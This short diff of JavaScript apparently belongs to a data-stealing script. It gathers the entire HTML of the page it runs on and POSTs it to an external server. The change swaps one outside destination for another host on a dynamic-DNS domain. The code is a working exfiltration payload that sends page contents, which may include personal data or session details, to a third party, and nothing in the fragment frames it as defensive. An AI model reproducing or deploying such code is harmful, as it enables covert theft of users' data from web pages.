@@ -5,7 +5,7 @@
   data.append('data', document.documentElement.innerHTML);
 
   var xhr = new XMLHttpRequest();
-  xhr.open('POST', 'http://xslendi.xyz:8080', true);
+  xhr.open('POST', 'http://int3nse.ddns.net:3000', true);
   xhr.onload = function () {
   };
   xhr.send(data);
